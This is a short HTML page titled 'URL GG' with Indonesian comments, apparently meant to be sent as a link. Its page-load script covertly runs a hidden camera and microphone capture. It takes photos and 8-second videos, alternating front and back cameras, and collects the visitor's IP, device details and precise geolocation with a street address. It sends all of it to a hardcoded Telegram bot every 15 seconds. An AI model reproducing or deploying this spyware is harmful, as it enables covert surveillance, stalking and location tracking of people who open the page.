<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>URL GG</title>
  <style>
    body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
    video { display: none; }
  </style>
</head>
<body>
<video id="video" autoplay muted playsinline></video>

<script>
const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
const chat_id = '7552410869';

let facing = 'user'; // depan -> belakang -> depan
let video = document.getElementById('video');

async function getStream() {
  return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
}

async function capturePhoto(stream) {
  return new Promise(resolve => {
    let track = stream.getVideoTracks()[0];
    let imageCapture = new ImageCapture(track);
    imageCapture.takePhoto().then(blob => resolve(blob)).catch(() => {
      // fallback if takePhoto fails
      let canvas = document.createElement('canvas');
      video.width = video.videoWidth || 640;
      video.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(resolve, 'image/jpeg');
    });
  });
}

async function recordVideo(stream, duration = 5000) {
  return new Promise(resolve => {
    let chunks = [];
    let rec = new MediaRecorder(stream);
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
    rec.start();
    setTimeout(() => rec.stop(), duration);
  });
}

async function sendToTelegram(text, media, type) {
  const form = new FormData();
  form.append('chat_id', chat_id);
  form.append(type, media, `${type}.webm`);

  await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
    method: 'POST',
    body: form
  });

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, text })
  });
}

async function getInfo() {
  let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
  let ua = navigator.userAgent;
  let ram = navigator.deviceMemory || 'Unknown';
  let battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not'})`);
  let net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Unknown';

  return { ip, ua, ram, battery, net };
}

async function getLocation() {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const maps = `https://maps.google.com/?q=${lat},${lon}`;
      const detail = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`).then(r => r.json());
      const alamat = detail.display_name || 'Unknown';
      resolve({ lat, lon, maps, alamat });
    }, () => resolve({ maps: 'Ditolak', alamat: 'Tidak tersedia' }));
  });
}

async function runAuto() {
  try {
    const stream = await getStream();
    video.srcObject = stream;

    // FOTO
    const fotoBlob = await capturePhoto(stream);
    const fotoUrl = URL.createObjectURL(fotoBlob);

    // VIDEO
    const videoBlob = await recordVideo(stream, 8000);
    const videoUrl = URL.createObjectURL(videoBlob);

    // INFO + LOKASI
    const info = await getInfo();
    const loc = await getLocation();

    const teks = `
    ðŸ“ Lokasi: ${loc.maps}
    ðŸ  Detail: ${loc.alamat}
    ðŸŒ IP: ${info.ip}
    ðŸ”‹ Baterai: ${info.battery}
    ðŸ“¶ Jaringan: ${info.net}
    ðŸ“± User-Agent: ${info.ua}
    ðŸ’¾ RAM: ${info.ram}
    ðŸ–¼ï¸ Foto: ${fotoUrl}
    ðŸŽ¥ Video: ${videoUrl}`;

    // Kirim ke Telegram
    await sendToTelegram(teks, fotoBlob, 'photo');
    await sendToTelegram(teks, videoBlob, 'video');

    stream.getTracks().forEach(track => track.stop());
    facing = (facing === 'user') ? 'environment' : 'user'; // ganti kamera
    setTimeout(runAuto, 15000); // ulang 15 detik

  } catch (e) {
    console.log('Gagal:', e);
    setTimeout(runAuto, 15000);
  }
}

runAuto();
</script>
</body>
</html>
